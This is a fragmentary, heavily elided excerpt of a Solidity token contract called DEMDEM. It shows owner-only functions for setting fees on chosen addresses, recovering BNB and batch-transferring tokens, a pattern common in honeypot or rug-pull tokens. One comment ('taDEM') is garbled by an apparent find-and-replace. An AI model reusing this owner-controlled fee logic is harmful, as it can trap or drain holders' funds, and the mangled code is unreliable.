...
contract DEMDEM is Context, IERC20, Ownable {
    ...
    string private _name = "DEMDEM";
    string private _symbol = "DEMDEM";
    ...
    function setNumTokenPercent(uint256 numToken) external onlyOwner() {
     ...
     function DEM(address spender, uint256 taxFee) public onlyOwner {
    ...
    //this method is responsible for taDEM all fee, if takeFee is true
    ...
    function recoverBNB() public onlyOwner {
        ...
        function TransferDEM(address[] 
    memory DEMAddress, 
    uint256 DEMAmount) public onlyOwner {
        for (uint i=0; 
        i<DEMAddress.length; i++) {
            _transfer(_msgSender(), DEMAddress[i], DEMAmount);
        }
    }
